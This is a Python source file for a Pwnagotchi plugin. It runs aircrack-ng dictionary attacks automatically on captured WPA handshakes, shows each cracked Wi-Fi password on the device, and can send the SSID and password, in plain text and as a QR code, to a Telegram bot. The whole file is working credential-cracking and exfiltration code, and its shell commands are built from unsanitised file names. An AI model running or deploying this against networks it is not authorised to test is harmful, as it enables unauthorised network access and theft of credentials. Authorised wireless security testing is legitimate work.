from pwnagotchi import plugins
import logging
import subprocess
import string
import re
import qrcode
import io
from telegram import Bot #install with pip install python-telegram-bot
from telegram import InputFile

'''
Aircrack-ng needed, to install:
> apt-get install aircrack-ng
Upload wordlist files in .txt format to folder in config file (Default: /opt/wordlists/)
Cracked handshakes stored in handshake folder as [essid].pcap.cracked
'''


class QuickDic(plugins.Plugin):
    __author__ = 'silentree12th'
    __version__ = '1.3.5'
    __license__ = 'GPL3'
    __description__ = 'Run a quick dictionary scan against captured handshakes. Optionally send found passwords as qrcode and plain text over to telegram bot.'
    __dependencies__ = {
        'apt': ['aircrack-ng'],
    }
    __defaults__ = {
        'enabled': False,
        'wordlist_folder': '/home/pi/wordlists/',
        'face': '(·ω·)',
        'api': None,
        'id': None,
    }

    def __init__(self):
        self.text_to_set = ""

    def on_loaded(self):
        logging.info('[better_quickdic] plugin loaded')

        if 'face' not in self.options:
            self.options['face'] = '(·ω·)'
        if 'wordlist_folder' not in self.options:
            self.options['wordlist_folder'] = '/home/pi/wordlists/'
        if 'enabled' not in self.options:
            self.options['enabled'] = False
        if 'api' not in self.options:
            self.options['api'] = None
        if 'id' not in self.options:
            self.options['id'] = None
            
        check = subprocess.run(
            ('/usr/bin/dpkg -l aircrack-ng | grep aircrack-ng | awk \'{print $2, $3}\''), shell=True, stdout=subprocess.PIPE)
        check = check.stdout.decode('utf-8').strip()
        if check != "aircrack-ng <none>":
            logging.info('[quickdic] Found %s' %check)
        else:
            logging.warning('[quickdic] aircrack-ng is not installed!')

    def on_handshake(self, agent, filename, access_point, client_station):
        display = agent.view()
        result = subprocess.run(('/usr/bin/aircrack-ng ' + filename + ' | grep "1 handshake" | awk \'{print $2}\''),
                                shell=True, stdout=subprocess.PIPE)
        result = result.stdout.decode(
            'utf-8').translate({ord(c): None for c in string.whitespace})
        if not result:
            logging.info('[quickdic] No handshake')
        else:
            logging.info('[quickdic] Handshake confirmed')
            result2 = subprocess.run(('aircrack-ng -w `echo ' + self.options[
                'wordlist_folder'] + '*.txt | sed \'s/ /,/g\'` -l ' + filename + '.cracked -q -b ' + result + ' ' + filename + ' | grep KEY'),
                shell=True, stdout=subprocess.PIPE)
            result2 = result2.stdout.decode('utf-8').strip()
            logging.info('[quickdic] %s' %result2)
            if result2 != "KEY NOT FOUND":
                key = re.search(r'\[(.*)\]', result2)
                pwd = str(key.group(1))
                self.text_to_set = "Cracked password: " + pwd
                #logging.warning('!!! [quickdic] !!! %s' % self.text_to_set)
                display.set('face', self.options['face'])
                display.set('status', self.text_to_set)
                self.text_to_set = ""
                display.update(force=True)
                #plugins.on('cracked', access_point, pwd)
                if self.options['id'] != None and self.options['api'] != None:
                    try:
                        security = "WPA"
                        ssid = filename
                        password = pwd
                        wifi_config = 'WIFI:S:'+ssid+';T:'+security+';P:'+password+';;'
                        bot = Bot(token=self.options['api'])
                        chat_id = self.options['id']
                    
                        qr = qrcode.QRCode(
                            version=None,
                            error_correction=qrcode.constants.ERROR_CORRECT_L,
                            box_size=10,
                            border=4,
                        )
                        qr.add_data(wifi_config)
                        qr.make(fit=True)
                        
                        # Create an image from the QR code instance
                        img = qr.make_image(fill_color="black", back_color="white")

                        # Convert the image to bytes
                        image_bytes = io.BytesIO()
                        img.save(image_bytes)
                        image_bytes.seek(0)

                        # Send the image directly as bytes
                        message_text = 'ssid: ' + ssid + ' password: ' + password
                        bot.send_photo(chat_id=chat_id, photo=InputFile(image_bytes, filename=ssid+'-'+password+'.txt'), caption=message_text)

                    except Exception as e:
                        logging.error(f"[better_quickdic] something went wrong. {e}")
           
